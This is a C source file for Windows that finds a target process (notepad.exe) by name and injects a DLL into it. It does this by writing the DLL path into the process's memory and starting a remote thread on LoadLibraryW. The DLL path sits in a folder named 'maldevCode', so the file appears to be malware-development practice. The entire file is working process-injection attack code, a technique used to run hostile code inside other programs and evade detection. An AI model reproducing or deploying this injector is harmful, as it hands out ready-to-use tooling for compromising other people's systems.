#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>
#include <wctype.h>



PROCESSENTRY32W	Proc = {
		.dwSize = sizeof(PROCESSENTRY32W)
};

BOOL GetRemoteProcessHandle(IN LPWSTR szProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {
	HANDLE hSnapShot = NULL;

	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	if (!Process32FirstW(hSnapShot, &Proc)) {
		printf("[!] Process32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {

		WCHAR LowerName[MAX_PATH * 2];

		if (Proc.szExeFile) {
			DWORD	dwSize = lstrlenW(Proc.szExeFile);
			DWORD   i = 0;

			RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

			// Converting each charachter in Proc.szExeFile to a lower case character
			// and saving it in LowerName
			if (dwSize < MAX_PATH * 2) {

				for (; i < dwSize; i++)
					LowerName[i] = (WCHAR)towlower(Proc.szExeFile[i]);

				LowerName[i++] = '\0';
			}
		}

		// If the lowercase'd process name matches the process we're looking for
		if (wcscmp(LowerName, szProcessName) == 0) {
			// Save the PID
			*dwProcessId = Proc.th32ProcessID;
			// Open a handle to the process
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			if (*hProcess == NULL)
				printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());

			break;
		}

		// Retrieves information about the next process recorded the snapshot.
		// While a process still remains in the snapshot, continue looping
	} while (Process32NextW(hSnapShot, &Proc));


	_EndOfFunction:
		if (hSnapShot != NULL)
			CloseHandle(hSnapShot);
		if (*dwProcessId == 0 || *hProcess == NULL)
			return FALSE;
		return TRUE;
}

BOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR DllName) {

	BOOL		bSTATE = TRUE;

	LPVOID		pLoadLibraryW = NULL;
	LPVOID		pAddress = NULL;

	// fetching the size of DllName (including null) in bytes
	DWORD		dwSizeToWrite = (lstrlenW(DllName) + 1) * sizeof(WCHAR);

	SIZE_T		lpNumberOfBytesWritten = 0;

	HANDLE		hThread = NULL;

	pLoadLibraryW = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
	if (pLoadLibraryW == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	printf("[i] pAddress Allocated At : 0x%p Of Size : %d\n", pAddress, dwSizeToWrite);

	if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwSizeToWrite) {
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	printf("[i] Successfully Written %d Bytes\n", lpNumberOfBytesWritten);

	printf("[i] Executing Payload ... ");
	hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryW, pAddress, 0, NULL);
	if (hThread == NULL) {
		printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	printf("[+] DONE !\n");
	WaitForSingleObject(hThread, INFINITE);


_EndOfFunction:
	if (hThread)
		CloseHandle(hThread);
	return bSTATE;
}


int main() {

	LPWSTR szProcessName = L"notepad.exe";
	DWORD	dwProcessId = 0;
	HANDLE	hProcess = NULL;
	printf("[*] Attempting To Get Handle To %ws \n", szProcessName);
	if (!GetRemoteProcessHandle(szProcessName, &dwProcessId, &hProcess)) {
		printf("[!] Could Not Get Handle To %ws \n", szProcessName);
		return -1;
	}
	printf("[+] Got Handle To %ws With PID : %d And Handle : 0x%p \n", szProcessName, dwProcessId, hProcess);
	
	LPWSTR DllName = L"C:\\Users\\nxvh\\Documents\\maldevCode\\dll.dll";
	if (!InjectDllToRemoteProcess(hProcess, DllName)) {
		printf("[!] DLL Injection Failed ! \n");
		return -1;
	}
	printf("[+] DLL Injection Succeeded ! \n");


	return 0;
	
}
